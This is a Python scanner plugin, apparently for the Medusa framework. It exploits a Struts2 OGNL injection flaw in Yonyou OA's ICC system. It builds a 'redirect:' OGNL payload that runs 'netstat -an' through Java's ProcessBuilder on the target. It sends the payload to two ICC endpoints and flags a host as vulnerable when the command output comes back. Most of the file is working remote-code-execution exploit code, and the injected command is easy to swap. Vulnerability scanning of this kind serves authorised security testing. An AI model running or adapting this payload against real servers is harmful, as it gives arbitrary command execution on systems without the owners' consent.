#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Seeyou_icc_struts2"  # 插件名称
        self.info['name'] ='' #漏洞名称
        self.info['affects'] = "用友OA"  # 漏洞组件
        self.info['desc_content'] = "用友OA_ICC系统框架漏洞"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
urls=["/web/icc/chat/chat?c=1&s=1","/web/common/doUpload.action"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    Medusas=[]
    try:
        for turl in urls:
            payload_url = scheme+"://"+url+ ':' + str(port)+turl+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            # if ProxyIp!=None:
            #     proxies = {
            #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
            #         "http": "http://" + str(ProxyIp)
            #     }
            #     resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            # elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  con.lower().find('active internet connections')!=-1:
                Medusa = "{}存在用友OA_ICC系统框架漏洞 \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                _t = VulnerabilityInfo(Medusa)
                Medusas.append(str(Medusa))
                web = ClassCongregation.VulnerabilityDetails(_t.info)
                web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
        Medusas_str=''
        for i in Medusas:
            Medusas_str=Medusas_str+i
        return (str(Medusas_str))
    except:
            _ = VulnerabilityInfo('').info.get('algroup')
            _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类


#medusa('http://baidu.com','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/4',)